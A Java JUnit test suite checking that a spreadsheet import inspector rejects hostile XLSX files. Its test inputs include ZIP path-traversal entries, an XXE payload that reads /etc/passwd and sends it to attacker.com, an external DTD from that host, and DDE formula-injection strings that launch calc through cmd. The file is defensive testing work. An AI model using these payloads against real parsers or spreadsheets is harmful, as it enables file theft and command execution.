package com.amcs.infrastructure.excel.security;

import com.amcs.application.port.out.excel.HeaderValidationResult;
import com.amcs.infrastructure.excel.parser.HeaderValidator;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.xml.sax.InputSource;
import org.xml.sax.SAXParseException;
import org.xml.sax.XMLReader;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.StringReader;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

@DisplayName("Phase 5.7: Import Security & XLSX Adversarial Test Suite")
class ImportSecurityAdversarialTest {

    private final XlsxSecurityInspector inspector = new XlsxSecurityInspector();

    @Nested
    @DisplayName("A1: Archive & ZIP Malware Inspection")
    class ArchiveMalwareTests {

        @Test
        @DisplayName("Rejects truncated ZIP terminating right after magic bytes")
        void rejectsTruncatedZip() {
            byte[] truncated = new byte[]{0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00};
            assertThatThrownBy(() -> inspector.inspectAndBuffer(new ByteArrayInputStream(truncated)))
                .isInstanceOf(InvalidSpreadsheetException.class);
        }

        @Test
        @DisplayName("Rejects ZIP entry with absolute path")
        void rejectsAbsolutePathEntry() throws Exception {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            try (ZipOutputStream zos = new ZipOutputStream(baos)) {
                zos.putNextEntry(new ZipEntry("/etc/shadow"));
                zos.write("root:password".getBytes(StandardCharsets.UTF_8));
                zos.closeEntry();
            }

            assertThatThrownBy(() -> inspector.inspectAndBuffer(new ByteArrayInputStream(baos.toByteArray())))
                .isInstanceOf(InvalidSpreadsheetException.class)
                .hasMessageContaining("Suspicious archive entry path detected");
        }

        @Test
        @DisplayName("Rejects ZIP entry with Windows backslash path traversal")
        void rejectsBackslashPathTraversal() throws Exception {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            try (ZipOutputStream zos = new ZipOutputStream(baos)) {
                zos.putNextEntry(new ZipEntry("..\\..\\windows\\system32\\cmd.exe"));
                zos.write("payload".getBytes(StandardCharsets.UTF_8));
                zos.closeEntry();
            }

            assertThatThrownBy(() -> inspector.inspectAndBuffer(new ByteArrayInputStream(baos.toByteArray())))
                .isInstanceOf(InvalidSpreadsheetException.class)
                .hasMessageContaining("Suspicious archive entry path detected");
        }

        @Test
        @DisplayName("Rejects ZIP missing [Content_Types].xml")
        void rejectsMissingContentTypesXml() throws Exception {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            try (ZipOutputStream zos = new ZipOutputStream(baos)) {
                zos.putNextEntry(new ZipEntry("xl/workbook.xml"));
                zos.write("<workbook/>".getBytes(StandardCharsets.UTF_8));
                zos.closeEntry();
            }

            assertThatThrownBy(() -> inspector.inspectAndBuffer(new ByteArrayInputStream(baos.toByteArray())))
                .isInstanceOf(InvalidSpreadsheetException.class)
                .hasMessageContaining("missing essential OOXML structure");
        }

        @Test
        @DisplayName("Rejects ZIP missing xl/workbook.xml")
        void rejectsMissingWorkbookXml() throws Exception {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            try (ZipOutputStream zos = new ZipOutputStream(baos)) {
                zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
                zos.write("<Types/>".getBytes(StandardCharsets.UTF_8));
                zos.closeEntry();
            }

            assertThatThrownBy(() -> inspector.inspectAndBuffer(new ByteArrayInputStream(baos.toByteArray())))
                .isInstanceOf(InvalidSpreadsheetException.class)
                .hasMessageContaining("missing essential OOXML structure");
        }

        @Test
        @DisplayName("Rejects archive with suspicious nested archive extensions (.zip, .jar, .tar, .exe)")
        void rejectsNestedArchiveEntry() throws Exception {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            try (ZipOutputStream zos = new ZipOutputStream(baos)) {
                zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
                zos.write("<Types/>".getBytes(StandardCharsets.UTF_8));
                zos.closeEntry();
                zos.putNextEntry(new ZipEntry("xl/workbook.xml"));
                zos.write("<workbook/>".getBytes(StandardCharsets.UTF_8));
                zos.closeEntry();
                zos.putNextEntry(new ZipEntry("embedded/payload.exe"));
                zos.write(new byte[]{0x4D, 0x5A});
                zos.closeEntry();
            }

            assertThatThrownBy(() -> inspector.inspectAndBuffer(new ByteArrayInputStream(baos.toByteArray())))
                .isInstanceOf(InvalidSpreadsheetException.class);
        }

        @Test
        @DisplayName("Rejects decompression bomb with excessive compression ratio")
        void rejectsCompressionBombRatio() {
            XlsxSecurityInspector bombInspector = new XlsxSecurityInspector(50000, 1000000, 10, 5.0);
            byte[] highRatioPayload = new byte[1000];

            assertThatThrownBy(() -> bombInspector.inspect(highRatioPayload))
                .isInstanceOf(InvalidSpreadsheetException.class);
        }
    }

    @Nested
    @DisplayName("A2: XXE & Parameter Entity Attack Invariants")
    class XxeAdversarialTests {

        @Test
        @DisplayName("Rejects external parameter entities (XXE OOB exfiltration)")
        void rejectsExternalParameterEntities() throws Exception {
            XMLReader reader = SecureXmlReaderFactory.createSecureXmlReader();

            String oobPayload = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE data [
                  <!ENTITY % file SYSTEM "file:///etc/passwd">
                  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://attacker.com/?data=%file;'>">
                  %eval;
                  %error;
                ]>
                <data>test</data>
                """;

            assertThatThrownBy(() -> reader.parse(new InputSource(new StringReader(oobPayload))))
                .isInstanceOf(SAXParseException.class)
                .hasMessageContaining("DOCTYPE is disallowed");
        }

        @Test
        @DisplayName("Rejects external DTD declarations")
        void rejectsExternalDtd() throws Exception {
            XMLReader reader = SecureXmlReaderFactory.createSecureXmlReader();

            String dtdPayload = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE root SYSTEM "http://attacker.com/malicious.dtd">
                <root/>
                """;

            assertThatThrownBy(() -> reader.parse(new InputSource(new StringReader(dtdPayload))))
                .isInstanceOf(SAXParseException.class)
                .hasMessageContaining("DOCTYPE is disallowed");
        }
    }

    @Nested
    @DisplayName("A3: Formula Injection (CWE-1236) Adversarial Tests")
    class FormulaInjectionTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "=1+1",
            "=SUM(A1:B10)",
            "=cmd|' /C calc'!A0",
            "+1+2",
            "+cmd|' /C calc'!A0",
            "-5+10",
            "-cmd|' /C calc'!A0",
            "@SUM(A1:A5)",
            "@cmd|' /C calc'!A0",
            "\t=cmd|' /C calc'!A0",
            "\r=cmd|' /C calc'!A0"
        })
        @DisplayName("Sanitizes all formula injection prefixes with single quote")
        void sanitizesDangerousFormulaPrefixes(String formula) {
            String escaped = FormulaEscaper.escape(formula);
            assertThat(escaped).startsWith("'");
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "Alice Smith",
            "CS101",
            "alice@univ.edu",
            "REG_2026_001",
            "Room 101",
            "12345",
            ""
        })
        @DisplayName("Preserves legitimate benign inputs without prepending single quote")
        void preservesSafeStrings(String safeString) {
            String escaped = FormulaEscaper.escape(safeString);
            assertThat(escaped).isEqualTo(safeString);
        }

        @Test
        @DisplayName("Preserves non-ASCII Unicode and Emoji safely")
        void preservesUnicodeAndEmoji() {
            String unicodeString = "Dr. Müller-Schulz 🎓 🚀 实验室";
            String escaped = FormulaEscaper.escape(unicodeString);
            assertThat(escaped).isEqualTo(unicodeString);
        }
    }

    @Nested
    @DisplayName("A4: Header Schema Adversarial Tests")
    class HeaderAdversarialTests {

        @Test
        @DisplayName("Rejects workbook with duplicate headers")
        void rejectsDuplicateHeaders() {
            HeaderValidationResult result = HeaderValidator.validate(
                List.of("Student Name", "Registration Number", "Student Name"),
                List.of("Student Name", "Registration Number"),
                List.of()
            );
            assertThat(result.isValid()).isFalse();
            assertThat(result.duplicateHeaders()).contains("Student Name");
        }

        @Test
        @DisplayName("Rejects workbook missing required headers")
        void rejectsMissingRequiredHeaders() {
            HeaderValidationResult result = HeaderValidator.validate(
                List.of("Registration Number"),
                List.of("Student Name", "Registration Number"),
                List.of()
            );
            assertThat(result.isValid()).isFalse();
            assertThat(result.missingHeaders()).contains("Student Name");
        }

        @Test
        @DisplayName("Rejects workbook with empty header list")
        void rejectsEmptyHeaders() {
            HeaderValidationResult result = HeaderValidator.validate(
                List.of(),
                List.of("Student Name", "Registration Number"),
                List.of()
            );
            assertThat(result.isValid()).isFalse();
            assertThat(result.errors()).isNotEmpty();
        }
    }
}
